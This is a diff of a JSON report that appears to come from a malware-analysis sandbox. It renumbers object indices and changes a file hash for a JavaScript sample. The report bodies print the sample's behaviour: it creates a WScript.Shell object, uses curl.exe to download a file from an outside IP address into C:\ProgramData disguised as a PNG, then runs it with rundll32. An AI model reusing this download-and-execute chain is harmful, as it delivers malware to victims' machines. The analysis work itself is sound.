@@ -83,7 +83,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[16]\n\n\t\tnew WScript.Shell[18]\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[15]\n\n\t\tnew WScript.Shell[17]\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -105,7 +105,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].Run(curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.d...",
+        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[17].Run(curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.d...",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -127,7 +127,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].Run(curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.d...",
+        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[17].Run(curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.d...",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -149,7 +149,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell application\n\t\tShell.Application[19].ShellExecute(rundll32,C:\\ProgramData\\index1.png,Wind,,open,3)\n",
+        "body": "JavaScript runs code via shell application\n\t\tShell.Application[18].ShellExecute(rundll32,C:\\ProgramData\\index1.png,Wind,,open,3)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -275,7 +275,7 @@
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "e0de6fa9fd78f1036d9b02caa0eb70bdbc0e3c030e1f4b8aceb2700b8b5f0d7b"
+        "sha256": "d4b2a1f86f01fe67553747925196d9a154fe20ca63e921268056079b0b950850"
       }
     ]
   },
